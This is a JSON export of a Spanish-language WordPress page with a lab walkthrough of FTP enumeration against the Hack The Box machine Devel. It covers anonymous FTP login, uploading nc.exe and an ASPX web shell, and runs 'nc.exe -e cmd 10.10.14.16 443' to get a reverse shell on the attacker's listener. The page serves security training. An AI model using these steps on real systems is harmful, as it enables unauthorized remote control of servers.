{"id":162,"date":"2024-02-10T00:59:40","date_gmt":"2024-02-09T23:59:40","guid":{"rendered":"http:\/\/localhost\/ethicalhacking\/?page_id=162"},"modified":"2024-02-10T00:59:40","modified_gmt":"2024-02-09T23:59:40","slug":"enumeracion-ftp","status":"publish","type":"page","link":"http:\/\/localhost\/ethicalhacking\/enumeracion-ftp\/","title":{"rendered":"Enumeraci\u00f3n FTP"},"content":{"rendered":"\n<p>Definici\u00f3n:<\/p>\n\n\n\n<p>FTP, acr\u00f3nimo de \u00abFile Transfer Protocol\u00bb en ingl\u00e9s, se refiere a un protocolo est\u00e1ndar de Internet utilizado para transferir archivos entre sistemas conectados a una red, como la Internet. Por otro lado, un puerto en inform\u00e1tica es un punto final de una conexi\u00f3n de comunicaci\u00f3n bidireccional donde los intercambios de informaci\u00f3n pueden tener lugar entre un proceso de software y otro. En el caso de FTP, el puerto est\u00e1ndar utilizado es el puerto 21.<\/p>\n\n\n\n<p>La \u00abenumeraci\u00f3n de FTP\u00bb se refiere al proceso de recopilaci\u00f3n de informaci\u00f3n sobre un servidor FTP. Esto puede incluir la obtenci\u00f3n de listados de directorios, identificaci\u00f3n de usuarios y grupos, b\u00fasqueda de vulnerabilidades, an\u00e1lisis de configuraciones y cualquier otra informaci\u00f3n relevante sobre el servidor FTP y su entorno. La enumeraci\u00f3n de FTP es una etapa com\u00fan en el proceso de evaluaci\u00f3n de seguridad de sistemas, donde los investigadores o atacantes intentan comprender la configuraci\u00f3n y la estructura del servidor FTP para identificar posibles puntos d\u00e9biles o \u00e1reas de inter\u00e9s para futuros ataques.<\/p>\n\n\n\n<p>En este cap\u00edtulo vamos a tratar de comprometer una m\u00e1quina aprovech\u00e1ndonos de la autenticaci\u00f3n an\u00f3nima en FTP. La autenticaci\u00f3n an\u00f3nima en FTP es un m\u00e9todo de acceso que permite a los usuarios conectarse a un servidor FTP sin proporcionar credenciales de usuario (nombre de usuario y contrase\u00f1a). En lugar de eso, los usuarios pueden acceder al servidor FTP utilizando un nombre de usuario predeterminado, com\u00fanmente \u00abanonymous\u00bb :<\/p>\n\n\n\n<p>Para este caso analizaremos la m\u00e1quina Windows Devel (10.10.10.5 ) de la plataforma Hack The Box.<\/p>\n\n\n\n<p>Primero realizamos un escaneo de puertos con la herramienta nmap:<\/p>\n\n\n\n<p>sudo nmap -p- &#8211;open -sS &#8211;min-rate 5000 -vvv -n -Pn 10.10.10.5 -oG allPorts<\/p>\n\n\n\n<p>El resultado muestra que el puerto 21 (FTP) est\u00e1 abierto.<\/p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"1568\" height=\"339\" src=\"http:\/\/localhost\/ethicalhacking\/wp-content\/uploads\/2024\/02\/image-40.png\" alt=\"\" class=\"wp-image-163\" style=\"width:1029px;height:auto\"\/><\/figure>\n\n\n\n<p>Con este comando empleando de nuevo nmap  vamos a tratar de obtener m\u00e1s detalles sobre el servicio que se est\u00e1 empleando en el puerto 21:<\/p>\n\n\n\n<p>sudo nmap -sCV -p21 10.10.10.5 -oN targeted<\/p>\n\n\n\n<p>El resultado me indica que el puerto 21 permite un login an\u00f3nimo (Anonymous FTP login allowed)<\/p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"1443\" height=\"195\" src=\"http:\/\/localhost\/ethicalhacking\/wp-content\/uploads\/2024\/02\/image-41.png\" alt=\"\" class=\"wp-image-164\" style=\"width:1038px;height:auto\"\/><\/figure>\n\n\n\n<p>A continuaci\u00f3n trato de acceder al servidor FTP :<\/p>\n\n\n\n<p>ftp 10.10.10.5<\/p>\n\n\n\n<p>Me solicita nombre de usuario, para ello introduzco anonymous, para la contrase\u00f1a pulso Enter y con ello consigo entrar al servidor:<\/p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"1053\" height=\"423\" src=\"http:\/\/localhost\/ethicalhacking\/wp-content\/uploads\/2024\/02\/image-42.png\" alt=\"\" class=\"wp-image-165\" style=\"width:1029px;height:auto\"\/><\/figure>\n\n\n\n<p>Para listar los archivos que est\u00e1n almacenados, utilizo el comando dir:<\/p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"1069\" height=\"482\" src=\"http:\/\/localhost\/ethicalhacking\/wp-content\/uploads\/2024\/02\/image-43.png\" alt=\"\" class=\"wp-image-166\" style=\"width:1027px;height:auto\"\/><\/figure>\n\n\n\n<p>Tengo capacidad de escritura y lectura, por tanto, puedo crear archivos (mkdir), subir archivos (put) y descargar los existentes (get).<\/p>\n\n\n\n<p>En esta fase de explotaci\u00f3n, podemos pensar en una manera de aprovecharnos de nuestra capacidad de escritura para depositar ciertos archivos que nos permitan tomar control de la m\u00e1quina, trataremos de ejecutar una reverse shell aprovech\u00e1ndonos de la interfaz web del servidor, en este caso se trata de un Windows IIS :<\/p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"1385\" height=\"522\" src=\"http:\/\/localhost\/ethicalhacking\/wp-content\/uploads\/2024\/02\/image-44.png\" alt=\"\" class=\"wp-image-167\" style=\"width:988px;height:auto\"\/><\/figure>\n\n\n\n<p>La \u00abreverse shell\u00bb  es una t\u00e9cnica para lograr acceso a la l\u00ednea de comandos o terminal del sistema que estamos atacando y, por tanto, tomar el control de la misma.<\/p>\n\n\n\n<p>Para ello ser\u00e1 necesario  utilizar netcat, una herramienta  que se encargar\u00e1 de traer la terminal de un sistema operativo Windows:<\/p>\n\n\n\n<p>Nos descargamos primero netcat (nc.exe) que previamente se encuentra en nuestra m\u00e1quina atacante (10.10.14.16) , abajo  la ruta absoluta:<\/p>\n\n\n\n<p>put nc.exe<\/p>\n\n\n\n<p>\/usr\/share\/seclists\/Web-Shells\/FuzzDB\/nc.exe<\/p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"1538\" height=\"600\" src=\"http:\/\/localhost\/ethicalhacking\/wp-content\/uploads\/2024\/02\/image-45.png\" alt=\"\" class=\"wp-image-168\" style=\"width:993px;height:auto\"\/><\/figure>\n\n\n\n<p>Para ejecutar el comando netcat y comprometer la m\u00e1quina necesitamos una web shell, este es  un recurso donde poder ejecutar comandos desde el servidor IIS, para ello vamos a tratar de subir el archivo \u00abaspx_cmd.aspx\u00bb lo descargamos de igual modo con put:<\/p>\n\n\n\n<p>\/usr\/share\/davtest\/backdoors\/aspx_cmd.aspx<\/p>\n\n\n\n<p>put aspx_cmd.aspx<\/p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"1539\" height=\"488\" src=\"http:\/\/localhost\/ethicalhacking\/wp-content\/uploads\/2024\/02\/image-46.png\" alt=\"\" class=\"wp-image-169\" style=\"width:1009px;height:auto\"\/><\/figure>\n\n\n\n<p>Podemos comprobar que accediendo a la ruta nos muestra la web shell:<\/p>\n\n\n\n<p>http:\/\/10.10.10.5\/aspx_cmd.aspx<\/p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"1000\" height=\"425\" src=\"http:\/\/localhost\/ethicalhacking\/wp-content\/uploads\/2024\/02\/image-47.png\" alt=\"\" class=\"wp-image-170\" style=\"width:1000px;height:auto\"\/><\/figure>\n\n\n\n<p>Desde la web podemos ejecutar comandos y obtener informaci\u00f3n de la m\u00e1quina que estamos atacando, por ejemplo con el comando dir: <\/p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"803\" height=\"578\" src=\"http:\/\/localhost\/ethicalhacking\/wp-content\/uploads\/2024\/02\/image-48.png\" alt=\"\" class=\"wp-image-171\" style=\"width:1005px;height:auto\"\/><\/figure>\n\n\n\n<p>Los archivos que hemos descargado est\u00e1n por defecto en la ruta que sincroniza el servidor IIS:<\/p>\n\n\n\n<p>C:\\inetpub\\wwwroot\\<\/p>\n\n\n\n<p>Desde esta ruta podemos ejecutar netcat:<\/p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"861\" height=\"682\" src=\"http:\/\/localhost\/ethicalhacking\/wp-content\/uploads\/2024\/02\/image-49.png\" alt=\"\" class=\"wp-image-172\" style=\"width:991px;height:auto\"\/><\/figure>\n\n\n\n<p>Procedemos a obtener la reverse shell con netcat, para ello no ponemos  en escucha desde la m\u00e1quina atacante (10.10.14.16)  por un puerto, en este caso el 443:<\/p>\n\n\n\n<p>nc -nlvp 443<\/p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"780\" height=\"353\" src=\"http:\/\/localhost\/ethicalhacking\/wp-content\/uploads\/2024\/02\/image-50.png\" alt=\"\" class=\"wp-image-173\" style=\"width:993px;height:auto\"\/><\/figure>\n\n\n\n<p>El comando para obtener la reverse shell es el siguiente: nc.exe -e cmd 10.10.14.16 443<\/p>\n\n\n\n<p>Lo ejecutamos desde la web shell: C:\\inetpub\\wwwroot\\nc.exe -e cmd 10.10.14.16 443<\/p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"856\" height=\"435\" src=\"http:\/\/localhost\/ethicalhacking\/wp-content\/uploads\/2024\/02\/image-51.png\" alt=\"\" class=\"wp-image-174\" style=\"width:993px;height:auto\"\/><\/figure>\n\n\n\n<p>Finalmente, obtenemos acceso al sistema desde nuestra m\u00e1quina atacante (10.10.14.16)<\/p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"850\" height=\"467\" src=\"http:\/\/localhost\/ethicalhacking\/wp-content\/uploads\/2024\/02\/image-52.png\" alt=\"\" class=\"wp-image-175\" style=\"width:995px;height:auto\"\/><\/figure>\n","protected":false},"excerpt":{"rendered":"<p>Definici\u00f3n: FTP, acr\u00f3nimo de \u00abFile Transfer Protocol\u00bb en ingl\u00e9s, se refiere a un protocolo est\u00e1ndar de Internet utilizado para transferir archivos entre sistemas conectados a una red, como la Internet. Por otro lado, un puerto en inform\u00e1tica es un punto final de una conexi\u00f3n de comunicaci\u00f3n bidireccional donde los intercambios de informaci\u00f3n pueden tener lugar [&hellip;]<\/p>\n","protected":false},"author":1,"featured_media":0,"parent":0,"menu_order":0,"comment_status":"closed","ping_status":"closed","template":"","meta":{"footnotes":""},"_links":{"self":[{"href":"http:\/\/localhost\/ethicalhacking\/wp-json\/wp\/v2\/pages\/162"}],"collection":[{"href":"http:\/\/localhost\/ethicalhacking\/wp-json\/wp\/v2\/pages"}],"about":[{"href":"http:\/\/localhost\/ethicalhacking\/wp-json\/wp\/v2\/types\/page"}],"author":[{"embeddable":true,"href":"http:\/\/localhost\/ethicalhacking\/wp-json\/wp\/v2\/users\/1"}],"replies":[{"embeddable":true,"href":"http:\/\/localhost\/ethicalhacking\/wp-json\/wp\/v2\/comments?post=162"}],"version-history":[{"count":1,"href":"http:\/\/localhost\/ethicalhacking\/wp-json\/wp\/v2\/pages\/162\/revisions"}],"predecessor-version":[{"id":176,"href":"http:\/\/localhost\/ethicalhacking\/wp-json\/wp\/v2\/pages\/162\/revisions\/176"}],"wp:attachment":[{"href":"http:\/\/localhost\/ethicalhacking\/wp-json\/wp\/v2\/media?parent=162"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}